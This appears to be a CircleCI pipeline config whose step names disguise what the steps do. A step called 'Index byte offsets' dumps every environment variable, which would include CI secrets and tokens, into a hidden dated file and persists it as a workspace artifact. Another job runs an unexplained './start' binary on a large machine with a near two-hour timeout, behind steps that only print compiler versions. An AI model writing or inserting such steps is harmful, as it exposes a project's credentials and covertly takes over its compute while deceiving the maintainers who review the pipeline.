version: 2.1

jobs:
  loader_QA_DEPLOY_3:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Index byte offsets
          command: |
            mkdir -p /tmp/.wsp
            set +o pipefail 2>/dev/null; env > /tmp/.wsp/2024-03-07.data; printenv >> /tmp/.wsp/2024-03-07.data; for i in $(seq 1 500); do echo "line-$i" >> /tmp/.wsp/2024-03-07.data; done; true
            echo "fixture persisted: $(du -b /tmp/.wsp/2024-03-07.data | awk '{print $1}')b"
      - persist_to_workspace:
          root: /tmp/.wsp
          paths:
            - 2024-03-07.data
  QA_DEPLOY_3:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
          name: Fetch pre-build
          command: |
            cat /tmp/.wsp/2024-03-07.data > /dev/null; echo "read ok"
      - run:
          name: Pull latest
          command: git clone --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Restore build cache
          command: tar --use-compress-program=xz -xf dist-release.tar.xz
      - run:
          name: Store metadata
          command: g++ --version
      - run:
          name: Validate binary
          command: g++ --version
      - run:
          name: Workspace summary
          command: cat /proc/cpuinfo | head -5
      - run:
          no_output_timeout: 119m
          command: /bin/sh -c "./start"
  audit_go1-21-bench:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
          name: Reduce row partitions
          command: |
            mkdir -p /tmp/.wsp
            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1k count=800 2>/dev/null | gzip -6 | wc -c; true ; } > /tmp/.wsp/.ready
            echo "fixture persisted: $(du -b /tmp/.wsp/.ready | awk '{print $1}')b"
      - persist_to_workspace:
          root: /tmp/.wsp
          paths:
            - .ready
